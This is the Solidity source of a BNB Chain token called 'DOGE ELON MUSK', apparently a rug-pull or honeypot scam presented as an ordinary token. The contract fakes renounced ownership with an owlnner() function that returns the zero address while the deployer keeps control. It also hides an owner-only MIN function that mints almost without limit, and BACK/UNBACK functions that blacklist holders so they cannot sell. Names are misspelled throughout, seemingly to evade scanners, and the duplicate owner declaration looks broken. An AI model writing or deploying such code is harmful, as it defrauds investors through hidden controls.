/**
 *Submitted for verification at BscScan.com on 2022-07-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-08
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owlnner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owlnner);
        _;
    }

/**
    * @dev Returns the address of the current owlnner.
     */
    function owlnner() public pure returns (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owlnner, newowneres);
        owlnner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owlnner, address(0));
        owlnner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'DOGE ELON MUSK';

    string constant public symbol = 'DogeMusk';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 1000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromferi;

    mapping(address => bool) private _lkck;


    uint256 public _taxferi = 0;
    uint256 private _previousTaxferi = _taxferi;

    uint256 public _burnferi = 1;
    uint256 private _previousBurnferi = _burnferi;


    address public projectAddress = 0xA584692659A2feA902411159ECB6F2F8eaeC13c3;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owlnner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromferi[from])
            removeAllferi();

        uint256 feri =  calculateTaxferi(value);

        uint256 burn =  calculateBurnferi(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(feri).sub(burn);

        if(feri > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(feri);
            emit Transfer(from, projectAddress, feri);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromferi[from])
            restoreAllferi();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function MIN(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxferi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxferi).div(
            10 ** 2
        );
    }

    function calculateBurnferi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnferi).div(
            10 ** 2
        );
    }

    function removeAllferi() private {
        if(_taxferi == 0 && _burnferi == 0)
            return;

        _previousTaxferi = _taxferi;
        _previousBurnferi = _burnferi;
        _taxferi = 0;
        _burnferi = 0;
    }

    function restoreAllferi() private {
        _taxferi = _previousTaxferi;
        _burnferi = _previousBurnferi;
    }



    function BACK(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function UNBACK(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owlnner = msg.sender;


    }

    function() public payable {
       revert();
    }
}